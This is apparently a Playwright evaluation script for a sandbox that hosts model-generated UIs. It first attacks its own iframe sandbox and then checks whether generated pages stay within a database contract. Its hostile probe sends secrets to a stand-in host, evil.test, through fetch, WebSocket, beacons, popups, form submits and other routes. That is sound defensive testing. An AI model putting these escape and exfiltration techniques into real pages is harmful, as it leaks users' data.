// Does a model stay inside the contract?   node demo/evaluate.js [screenshot-dir]
//
// The files in demo/generated/ were each written by a model that was given one surface contract and
// the description of `window.surface`, nothing else. This script runs every one of them for real:
// in the sandbox (demo/sandbox.js), against a live GenDB, driven like a user would drive it through
// labels and button names taken from the contract. It records every request the UI sends and what
// the database answered, anything the sandbox policy blocked, and script errors.
//
// A development tool: it needs Playwright with Chromium, which is not a dependency of GenDB itself.

import { readFile, readdir, mkdir } from 'node:fs/promises';
import { createRequire } from 'node:module';
import { fileURLToPath } from 'node:url';
import { HOST_CSP, SANDBOX_ATTRIBUTE, sandboxDocument } from './sandbox.js';
import { createDatabase, agentKneePain, KIM, KNEE_BRANCH } from './scenario.js';

const { chromium } = createRequire(import.meta.url)('playwright');
const dir = fileURLToPath(new URL('./generated/', import.meta.url));
const shots = process.argv[2];
if (shots) await mkdir(shots, { recursive: true });

// The host page: holds nothing but the relay between the iframe and the functions Node exposes.
const HOST = `<!doctype html><meta charset="utf-8"><meta http-equiv="Content-Security-Policy" content="${HOST_CSP}"><style>html,body{margin:0;height:100%}iframe{border:0;width:100%;height:100%;display:block}</style>
<iframe sandbox="${SANDBOX_ATTRIBUTE}"></iframe>
<script>
  const frame = document.querySelector('iframe');
  let last = null;
  window.__push = (result) => { last = result; frame.contentWindow.postMessage({ gendb: 'result', result }, '*'); };
  addEventListener('message', async (event) => {
    if (event.source !== frame.contentWindow || !event.data) return;
    const m = event.data;
    if (m.gendb === 'ready' && last) window.__push(last);
    if (m.gendb === 'act') frame.contentWindow.postMessage({ gendb: 'acted', call: m.call, outcome: await window.__act(m.action, m.id, m.params) }, '*');
    if (m.gendb === 'violation' || m.gendb === 'error') window.__report(m);
  });
  window.__mount = (srcdoc) => { frame.srcdoc = srcdoc; };
</script>`;

// What a user would do with each UI, expressed only in terms the contract provides.
const today = new Date().toISOString().slice(0, 10);
const logRun = async (ui, { distance, minutes }) => {
  await ui.getByLabel('Datum', { exact: true }).first().fill(today);
  await ui.getByLabel('Afstand', { exact: true }).first().fill(distance);
  await ui.getByLabel('Duur', { exact: true }).first().fill(minutes);
  await ui.getByRole('button', { name: 'Run loggen', exact: true }).first().click();
};

const SCRIPTS = {
  'mijn-runs': [
    ['een geldige run loggen', (ui) => logRun(ui, { distance: '7,5', minutes: '41' })],
    ['een onmogelijk tempo loggen (10 km in 5 min)', (ui) => logRun(ui, { distance: '10', minutes: '5' })],
    ['een onmogelijke afstand loggen (500 km)', (ui) => logRun(ui, { distance: '500', minutes: '3000' })],
  ],
  'knie-en-afstand': [
    ['een pijnscore verbeteren naar 8', async (ui) => { const input = ui.getByLabel('Kniepijn', { exact: true }).first(); await input.fill('8'); await input.press('Enter'); }],
    ['een onmogelijke pijnscore invullen (15)', async (ui) => { const input = ui.getByLabel('Kniepijn', { exact: true }).nth(1); await input.fill('15'); await input.press('Enter'); }],
  ],
};

const browser = await chromium.launch();
const report = [];

// -- part 1: does the sandbox hold? ---------------------------------------------------------------
// A deliberately hostile document tries every way out it can think of. Any request that leaves the
// page is seen (and answered) by the route below, so "nothing left" is observed, not assumed.

async function attackSandbox() {
  const page = await browser.newPage();
  const escaped = [];
  await page.route('**/*', (route) => {
    if (!route.request().url().startsWith('http://gendb.test/')) escaped.push(route.request().url());
    route.fulfill({ status: 200, contentType: 'text/html', body: '<!doctype html><title>x</title>' });
  });
  await page.goto('http://gendb.test/host'); // gives the host page a real origin to defend
  // Each call gives a fresh hostile document in a fresh frame.
  const mount = async () => {
    await page.setContent(HOST);
    await page.evaluate((srcdoc) => window.__mount(srcdoc), sandboxDocument('<!doctype html><html><body><p>hostile</p></body></html>', { name: 'probe' }));
    await page.waitForTimeout(300);
    return page.frames()[1];
  };

  const results = await (await mount()).evaluate(async () => {
    const out = {};
    const attempt = async (name, fn) => { try { out[name] = String(await fn()); } catch (e) { out[name] = `blocked (${e.name})`; } };
    const refuse = (name) => new DOMException(name, 'Refused');
    await attempt('fetch', () => fetch('https://evil.test/fetch?secret=1').then(() => 'LEAKED'));
    await attempt('XMLHttpRequest', () => new Promise((res, rej) => { const x = new XMLHttpRequest(); x.open('GET', 'https://evil.test/xhr'); x.onload = () => res('LEAKED'); x.onerror = () => rej(refuse('xhr')); x.send(); }));
    await attempt('WebSocket', () => new Promise((res, rej) => { const w = new WebSocket('wss://evil.test/ws'); w.onopen = () => res('LEAKED'); w.onerror = () => rej(refuse('ws')); }));
    await attempt('image beacon', () => new Promise((res, rej) => { const i = new Image(); i.onload = () => res('LEAKED'); i.onerror = () => rej(refuse('img')); i.src = 'https://evil.test/pixel.png?secret=1'; }));
    await attempt('remote stylesheet', () => new Promise((res, rej) => { const l = document.createElement('link'); l.rel = 'stylesheet'; l.href = 'https://evil.test/s.css'; l.onload = () => res('LEAKED'); l.onerror = () => rej(refuse('css')); document.head.appendChild(l); }));
    await attempt('remote script', () => new Promise((res, rej) => { const sc = document.createElement('script'); sc.src = 'https://evil.test/s.js'; sc.onload = () => res('LEAKED'); sc.onerror = () => rej(refuse('js')); document.head.appendChild(sc); }));
    await attempt('sendBeacon', () => { navigator.sendBeacon('https://evil.test/beacon', 'secret=1'); return 'accepted by the API'; });
    await attempt('popup', () => { if (window.open('https://evil.test/popup?secret=1')) return 'OPENED'; throw refuse('popup'); });
    await attempt('navigate the top page', () => { top.location = 'https://evil.test/top?secret=1'; return 'accepted by the API'; });
    await attempt('read the host page', () => parent.document.title);
    await attempt('localStorage', () => { localStorage.setItem('a', 'b'); return 'STORED'; });
    await attempt('cookies', () => { document.cookie = 'a=b'; return 'STORED'; });
    await attempt('WebRTC (direct)', () => { if (typeof RTCPeerConnection === 'undefined') throw refuse('rtc'); return 'AVAILABLE'; });
    await attempt('WebRTC (via a nested frame)', () => new Promise((res, rej) => {
      addEventListener('message', (e) => { if (e.data?.nested) (e.data.nested === 'function' ? res('AVAILABLE') : rej(refuse('rtc'))); });
      const g = document.createElement('iframe'); g.srcdoc = '<script>parent.postMessage({ nested: typeof RTCPeerConnection }, "*")</script>'; document.body.appendChild(g);
      setTimeout(() => rej(refuse('rtc')), 800);
    }));
    return out;
  });
  // These two end the document whether or not they get anywhere, so each gets a frame of its own.
  await (await mount()).evaluate(() => { const f = document.createElement('form'); f.action = 'https://evil.test/form?secret=1'; document.body.appendChild(f); f.submit(); }).catch(() => {});
  await page.waitForTimeout(400);
  results['form submit'] = 'accepted by the API';
  await (await mount()).evaluate(() => { location.href = 'https://evil.test/self?secret=1'; }).catch(() => {});
  await page.waitForTimeout(400);
  results['navigate itself away'] = 'accepted by the API';
  await page.close();
  return { results, escaped };
}

const attack = await attackSandbox();
console.log('Sandbox: een vijandige pagina probeert te ontsnappen');
for (const [name, outcome] of Object.entries(attack.results)) {
  const left = attack.escaped.some((u) => u.includes(({ 'navigate itself away': '/self', 'form submit': '/form', sendBeacon: '/beacon', 'navigate the top page': '/top' })[name] ?? '\u0000'));
  const verdict = /LEAKED|OPENED|STORED/.test(outcome) || left ? 'GELEKT' : outcome === 'AVAILABLE' ? 'OPEN (bekend, zie docs/ontwerp.md)' : outcome.startsWith('blocked') ? 'tegengehouden' : 'tegengehouden (geen verzoek verliet de pagina)';
  console.log(`  ${name.padEnd(30)} ${verdict}`);
}
console.log(`  verzoeken die de pagina verlieten: ${attack.escaped.length}${attack.escaped.length ? ' ' + attack.escaped.join(', ') : ''}`);

// -- part 2: does a model stay inside the contract? ------------------------------------------------

for (const file of (await readdir(dir)).filter((f) => f.endsWith('.html')).sort()) {
  const [surfaceName, variant] = file.split('.');
  const db = createDatabase();
  if (surfaceName === 'knie-en-afstand') { agentKneePain(db); db.merge(KNEE_BRANCH, { approvedBy: KIM }); }
  const surface = db.open(surfaceName, { actor: KIM });
  const entry = { file, surface: surfaceName, variant, requests: [], blocked: [], errors: [], steps: [] };
  report.push(entry);

  for (const [width, height] of [[1280, 900], [360, 780]]) {
    const page = await browser.newPage({ viewport: { width, height } });
    page.on('pageerror', (e) => entry.errors.push(String(e)));
    page.on('console', (m) => { if (m.type() === 'error') entry.errors.push(m.text()); });
    await page.exposeFunction('__report', (m) => (m.gendb === 'violation' ? entry.blocked : entry.errors).push(m.gendb === 'violation' ? `${m.directive}: ${m.blocked}` : m.message));
    await page.exposeFunction('__act', (action, id, params) => {
      let outcome;
      try { outcome = surface.act(action, { id, params }, { intent: `via ${file}` }); } catch (err) { if (!err.toJSON) throw err; outcome = err.toJSON(); }
      if (width > 400) entry.requests.push({ action, params, ok: outcome.ok, code: outcome.error?.violations?.map((v) => v.code).join('+') ?? outcome.error?.code });
      return outcome;
    });
    await page.setContent(HOST);
    await page.evaluate((srcdoc) => window.__mount(srcdoc), sandboxDocument(await readFile(dir + file, 'utf8'), surface.describe()));
    const stop = surface.subscribe((result) => page.evaluate((r) => window.__push(r), result).catch(() => {}));
    const ui = page.frameLocator('iframe');
    await page.waitForTimeout(500);

    const overflow = await page.frames()[1].evaluate(() => document.documentElement.scrollWidth - document.documentElement.clientWidth);
    if (width <= 400) entry.overflowAt360 = overflow;
    if (shots) await page.screenshot({ path: `${shots}/${surfaceName}.${variant}.${width}.png`, fullPage: false });

    if (width > 400) {
      for (const [label, run] of SCRIPTS[surfaceName]) {
        const before = entry.requests.length;
        let problem = null;
        try { await run(ui); await page.waitForTimeout(400); } catch (err) { problem = String(err.message).split('\n')[0]; }
        const sent = entry.requests.slice(before);
        entry.steps.push({ step: label, sent: sent.map((r) => (r.ok ? `${r.action} ✓` : `${r.action} ✗ ${r.code}`)), problem });
      }
      if (shots) await page.screenshot({ path: `${shots}/${surfaceName}.${variant}.after.png`, fullPage: true });
    }
    stop();
    await page.close();
  }
}
await browser.close();

for (const e of report) {
  const refused = e.requests.filter((r) => !r.ok);
  // A request the database refused because the *user* typed something invalid is the UI working.
  // One refused for a name or shape the contract does not have is the model leaving the contract.
  const outside = refused.filter((r) => /UNKNOWN|NOT_IN_SURFACE|MISSING_PARAM|INVALID_PARAM|FIELD_NOT_EDITABLE/.test(r.code));
  console.log(`\n${e.file}`);
  for (const s of e.steps) console.log(`  ${s.step}: ${s.problem ? `HARNAS-FOUT ${s.problem}` : s.sent.join(', ') || 'niets verstuurd (door de UI zelf tegengehouden)'}`);
  console.log(`  verzoeken: ${e.requests.length}, geweigerd: ${refused.length}, buiten het contract: ${outside.length}`);
  console.log(`  door de sandbox geblokkeerd: ${e.blocked.length}, scriptfouten: ${e.errors.length}, horizontale overloop op 360px: ${e.overflowAt360}px`);
  for (const line of [...e.blocked, ...e.errors]) console.log(`    ! ${line}`);
}
process.exitCode = attack.escaped.length || report.some((e) => e.errors.length || e.blocked.length) ? 1 : 0;
